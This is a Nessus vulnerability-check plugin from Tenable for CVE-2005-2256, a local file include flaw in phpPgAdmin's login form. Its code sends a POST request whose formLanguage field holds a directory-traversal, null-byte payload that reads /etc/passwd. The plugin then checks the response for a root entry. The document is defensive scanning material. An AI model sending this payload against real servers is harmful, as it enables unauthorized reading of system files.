#
# (C) Tenable Network Security
#


if (description) {
  script_id(18637);
  script_version("$Revision: 1.5 $");

  script_cve_id("CVE-2005-2256");
  script_bugtraq_id(14142);
  if (defined_func("script_xref")) script_xref(name:"OSVDB", value:"17758");

  name["english"] = "phpPgAdmin formLanguage Parameter Local File Include Vulnerability";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

The remote web server contains a PHP script that is affected by a
local file include vulnerability. 

Description :

The remote host is running phpPgAdmin, a web-based administration tool
for PostgreSQL. 

The installed version of phpPgAdmin fails to filter directory
traversal sequences from user-input supplied to the 'formLanguage'
parameter of the login form.  An attacker can exploit this issue to
read files outside the application's document directory and to include
arbitrary PHP files from the remote host, subject to the privileges of
the web server userid. 

See also :

http://archives.neohapsis.com/archives/dailydave/2005-q3/0010.html
http://sourceforge.net/project/shownotes.php?release_id=342261

Solution : 

Upgrade to phpPgAdmin 3.5.4 or later.

Risk factor : 

Medium / CVSS Base Score : 6
(AV:R/AC:H/Au:NR/C:P/A:P/I:P/B:N)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for formLanguage parameter directory traversal vulnerability in phpPgAdmin";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Check whether the login script exists.
  req = http_get(item:string(dir, "/login.php"), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it does...
  if ('/login.php" method="post" name="login_form">' >< res) {
    # Try to exploit the flaw to read /etc/passwd.
    postdata = string(
      "formUsername=", SCRIPT_NAME, "&",
      "formPassword=nessus&",
      "formServer=0&",
      "formLanguage=../../../../../../../../../../etc/passwd%00&",
      "submitLogin=Login"
    );
    req = string(
      "POST ", dir, "/login.php HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "User-Agent: ", get_kb_item("global_settings/http_user_agent"), "\r\n",
      "Content-Type: application/x-www-form-urlencoded\r\n",
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if there's an entry for root.
    if (egrep(string:res, pattern:"root:.*:0:[01]:")) {
      security_warning(port);
      exit(0);
    }
  }
}
